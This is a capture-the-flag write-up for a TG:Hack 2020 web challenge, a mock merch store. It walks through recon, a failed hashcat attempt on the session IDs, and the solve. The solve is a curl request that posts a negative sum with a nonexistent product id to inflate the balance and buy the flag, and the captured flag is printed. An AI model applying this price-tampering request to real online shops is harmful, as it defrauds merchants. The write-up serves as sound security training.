### Challenge

```
We found the Mother cult merch store. In addition to selling clothing items they sell some secrets we need. For the time being we haven't been able to secure the funds necessary to do so. Can you help us?

shop.tghack.no
You can also use one of these mirrors:

us.shop.tghack.no (US)
```

### Recon

* It is a basic store that has the following functionalities
  * `Initial Balance` --> 100 dollars to start with
  * `Borrow` --> Allows to borrow money, max debt being 200 dollars
  * `Repay`  --> Allows repaying the debt 
  * `Buy shirt, hoodie, poking stick, flag` with flag costing 1337$

* Spoofing or Intercepting to change the values does not work
  * Changing the Borrow money does not work, the value returned is server side and checks for override somehow
  * Repay > balance also returns an error.
    * similarly negative amounts cause `You can't repay a negative amount of money. `
  * Buying items has a `id, value` combination which also does not work well with changing values
    * changing value returns insufficient funds
    * changing id to product that does not exist does not do anything!!!!

* How does it authenticate or know a particular user because it has been doing all logic on server side and responding correctly?
  * When you goto the shop in browser --> It first sets up a dedicated session using a id which is where the POST requests are sent for transactions
  * A few ids are, 
    * 624000c84531b1b6884aecec60cfe652eb4ef61963ad3e498522494b2f04765f
    * 23d6a5115eabbbfbae137c1b3d5fb6527e3bf565d44de1f51928434bd5638e11
    * eadc9945355bee0c6eab10dd8e3dfb80980d67b2e69e2460856a74af823147e1

* Hash identifier says sha256
```
kali@kali:~$ hash-identifier 
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 624000c84531b1b6884aecec60cfe652eb4ef61963ad3e498522494b2f04765f

Possible Hashs:
[+] SHA-256
[+] Haval-256

Least Possible Hashs:
[+] GOST R 34.11-94
[+] RipeMD-256
[+] SNEFRU-256
[+] SHA-256(HMAC)
[+] Haval-256(HMAC)
[+] RipeMD-256(HMAC)
[+] SNEFRU-256(HMAC)
[+] SHA-256(md5($pass))
[+] SHA-256(sha1($pass))
--------------------------------------------------
 HASH: eadc9945355bee0c6eab10dd8e3dfb80980d67b2e69e2460856a74af823147e1

Possible Hashs:
[+] SHA-256
[+] Haval-256
```

* But rockyou hashcat combination failed
```
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Approaching final keyspace - workload adjusted.  

Session..........: hashcat                       
Status...........: Exhausted
Hash.Type........: SHA2-256
Hash.Target......: hashes_shop.txt
Time.Started.....: Tue Apr 14 00:29:12 2020 (19 secs)
Time.Estimated...: Tue Apr 14 00:29:31 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   826.5 kH/s (1.98ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 0/3 (0.00%) Digests, 0/1 (0.00%) Salts
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]

Started: Tue Apr 14 00:28:56 2020
Stopped: Tue Apr 14 00:29:31 2020
```

* Hypothesis --> maybe time hash? wrote a script to give all the hashes per second time but did not match the one generated by the server

* The above was a part of overthinking it! There could be so much other strings to hash

### Solve

* After a while of fuzzing around, Altering the product ID to a non existent one and changing the value still has effect. 
* Money transactions take place for invalid product IDs, which bypasses the validation
* Changing to non-existent product id and altering money to negative value adds money to your account

  - Step 1: Connect to know your unique url
```bash
kali@kali:~$ curl -L -X GET http://shop.tghack.no/
<html>
    <head>
        <title>Bank</title>
<style>
form {
    vertical-align:middle;
}
</style>
    </head>
    <body>
        <div><a href="/f9e4241fb6aa8f74b878a5898d7e82d5df9142d80bc0a7753806def4bddff343/store">store</a></div>
        <div>
            <form action="/f9e4241fb6aa8f74b878a5898d7e82d5df9142d80bc0a7753806def4bddff343/bank" method="POST">
                <input type="text" name="borrow">
                <input type="submit" value="Borrow money">
            </form>
        </div>
        <div>
            <form action="/f9e4241fb6aa8f74b878a5898d7e82d5df9142d80bc0a7753806def4bddff343/bank" method="POST">
                <input type="text" name="repay">
                <input type="submit" value="Repay money">
            </form>
        </div>
        <div>
            
        </div>
        <div>
            <table><tr><td>Balance</td><td>100$</td></tr><tr><td>Debt</td><td>0$</td></tr></table>
        </div>
    </body>
</html>
kali@kali:~$
```
  - Step 2: Connect to Store

```bash
kali@kali:~$ curl -L -X GET  http://shop.tghack.no/f9e4241fb6aa8f74b878a5898d7e82d5df9142d80bc0a7753806def4bddff343/store
<html>
    <head>
        <title>Store</title>
<style>
td {
    vertical-align:top;
    padding-right: 10px;
}
</style>
    </head>
    <body>
        <div><a href="/f9e4241fb6aa8f74b878a5898d7e82d5df9142d80bc0a7753806def4bddff343/bank">bank</a></div>
        <div>
            <table>
                <tr>
    <td>25$</td>
    <td>Shirt</td>
    <td>
        <form action="/f9e4241fb6aa8f74b878a5898d7e82d5df9142d80bc0a7753806def4bddff343/store" method="POST">
            <input type="hidden" name="sum" value="25">
            <input type="hidden" name="id" value="10">
            <input type="submit" value="Buy">
        </form>
    </td>
</tr>
<tr>
    <td>35$</td>
    <td>Hoodie</td>
    <td>
        <form action="/f9e4241fb6aa8f74b878a5898d7e82d5df9142d80bc0a7753806def4bddff343/store" method="POST">
            <input type="hidden" name="sum" value="35">
            <input type="hidden" name="id" value="11">
            <input type="submit" value="Buy">
        </form>
    </td>
</tr>
<tr>
    <td>75$</td>
    <td>Poking stick</td>
    <td>
        <form action="/f9e4241fb6aa8f74b878a5898d7e82d5df9142d80bc0a7753806def4bddff343/store" method="POST">
            <input type="hidden" name="sum" value="75">
            <input type="hidden" name="id" value="12">
            <input type="submit" value="Buy">
        </form>
    </td>
</tr>
<tr>
    <td>1337$</td>
    <td>Flag</td>
    <td>
        <form action="/f9e4241fb6aa8f74b878a5898d7e82d5df9142d80bc0a7753806def4bddff343/store" method="POST">
            <input type="hidden" name="sum" value="1337">
            <input type="hidden" name="id" value="13">
            <input type="submit" value="Buy">
        </form>
    </td>
</tr>

            </table>
        </div>
        <div>
            
        </div>
    </body>
</html>
kali@kali:~$ 

```

  -  Step 3: Hack to increase balance - non existent id and negative amount
```bash
kali@kali:~$ curl -L -i -s -k -X $'POST' --data-binary $'sum=-1337&id=1300' $'https://shop.tghack.no/f9e4241fb6aa8f74b878a5898d7e82d5df9142d80bc0a7753806def4bddff343/store'
HTTP/1.1 200 OK
Server: nginx
Date: Tue, 14 Apr 2020 15:24:07 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1808
Connection: keep-alive
Strict-Transport-Security: max-age=31536000
X-Frame-Options: DENY
X-Content-Type-Options: nosniff

<html>
    <head>
        <title>Store</title>
<style>
td {
    vertical-align:top;
    padding-right: 10px;
}
</style>
    </head>
    <body>
        <div><a href="/f9e4241fb6aa8f74b878a5898d7e82d5df9142d80bc0a7753806def4bddff343/bank">bank</a></div>
        <div>
            <table>
                <tr>
    <td>25$</td>
    <td>Shirt</td>
    <td>
        <form action="/f9e4241fb6aa8f74b878a5898d7e82d5df9142d80bc0a7753806def4bddff343/store" method="POST">
            <input type="hidden" name="sum" value="25">
            <input type="hidden" name="id" value="10">
            <input type="submit" value="Buy">
        </form>
    </td>
</tr>
<tr>
    <td>35$</td>
    <td>Hoodie</td>
    <td>
        <form action="/f9e4241fb6aa8f74b878a5898d7e82d5df9142d80bc0a7753806def4bddff343/store" method="POST">
            <input type="hidden" name="sum" value="35">
            <input type="hidden" name="id" value="11">
            <input type="submit" value="Buy">
        </form>
    </td>
</tr>
<tr>
    <td>75$</td>
    <td>Poking stick</td>
    <td>
        <form action="/f9e4241fb6aa8f74b878a5898d7e82d5df9142d80bc0a7753806def4bddff343/store" method="POST">
            <input type="hidden" name="sum" value="75">
            <input type="hidden" name="id" value="12">
            <input type="submit" value="Buy">
        </form>
    </td>
</tr>
<tr>
    <td>1337$</td>
    <td>Flag</td>
    <td>
        <form action="/f9e4241fb6aa8f74b878a5898d7e82d5df9142d80bc0a7753806def4bddff343/store" method="POST">
            <input type="hidden" name="sum" value="1337">
            <input type="hidden" name="id" value="13">
            <input type="submit" value="Buy">
        </form>
    </td>
</tr>

            </table>
        </div>
        <div>
            
        </div>
    </body>
</html>
```

  - Step 4: Check increased balance and Buy the flag
```bash
kali@kali:~$ curl -L -X POST http://shop.tghack.no/f9e4241fb6aa8f74b878a5898d7e82d5df9142d80bc0a7753806def4bddff343/bank
<html>
    <head>
        <title>Bank</title>
<style>
form {
    vertical-align:middle;
}
</style>
    </head>
    <body>
        <div><a href="/f9e4241fb6aa8f74b878a5898d7e82d5df9142d80bc0a7753806def4bddff343/store">store</a></div>
        <div>
            <form action="/f9e4241fb6aa8f74b878a5898d7e82d5df9142d80bc0a7753806def4bddff343/bank" method="POST">
                <input type="text" name="borrow">
                <input type="submit" value="Borrow money">
            </form>
        </div>
        <div>
            <form action="/f9e4241fb6aa8f74b878a5898d7e82d5df9142d80bc0a7753806def4bddff343/bank" method="POST">
                <input type="text" name="repay">
                <input type="submit" value="Repay money">
            </form>
        </div>
        <div>
            
        </div>
        <div>
            <table><tr><td>Balance</td><td>1437$</td></tr><tr><td>Debt</td><td>0$</td></tr></table>
        </div>
    </body>
</html>
kali@kali:~$ curl -L -i -s -k -X $'POST' --data-binary $'sum=1337&id=13' $'https://shop.tghack.no/f9e4241fb6aa8f74b878a5898d7e82d5df9142d80bc0a7753806def4bddff343/store'
HTTP/1.1 200 OK
Server: nginx
Date: Tue, 14 Apr 2020 15:25:42 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1844
Connection: keep-alive
Strict-Transport-Security: max-age=31536000
X-Frame-Options: DENY
X-Content-Type-Options: nosniff

<html>
    <head>
        <title>Store</title>
<style>
td {
    vertical-align:top;
    padding-right: 10px;
}
</style>
    </head>
    <body>
        <div><a href="/f9e4241fb6aa8f74b878a5898d7e82d5df9142d80bc0a7753806def4bddff343/bank">bank</a></div>
        <div>
            <table>
                <tr>
    <td>25$</td>
    <td>Shirt</td>
    <td>
        <form action="/f9e4241fb6aa8f74b878a5898d7e82d5df9142d80bc0a7753806def4bddff343/store" method="POST">
            <input type="hidden" name="sum" value="25">
            <input type="hidden" name="id" value="10">
            <input type="submit" value="Buy">
        </form>
    </td>
</tr>
<tr>
    <td>35$</td>
    <td>Hoodie</td>
    <td>
        <form action="/f9e4241fb6aa8f74b878a5898d7e82d5df9142d80bc0a7753806def4bddff343/store" method="POST">
            <input type="hidden" name="sum" value="35">
            <input type="hidden" name="id" value="11">
            <input type="submit" value="Buy">
        </form>
    </td>
</tr>
<tr>
    <td>75$</td>
    <td>Poking stick</td>
    <td>
        <form action="/f9e4241fb6aa8f74b878a5898d7e82d5df9142d80bc0a7753806def4bddff343/store" method="POST">
            <input type="hidden" name="sum" value="75">
            <input type="hidden" name="id" value="12">
            <input type="submit" value="Buy">
        </form>
    </td>
</tr>
<tr>
    <td>1337$</td>
    <td>Flag</td>
    <td>
        <form action="/f9e4241fb6aa8f74b878a5898d7e82d5df9142d80bc0a7753806def4bddff343/store" method="POST">
            <input type="hidden" name="sum" value="1337">
            <input type="hidden" name="id" value="13">
            <input type="submit" value="Buy">
        </form>
    </td>
</tr>

            </table>
        </div>
        <div>
            TG20{I_just_want_to_buy_a_real_flag}
        </div>
    </body>
</html>
kali@kali:~$ 
```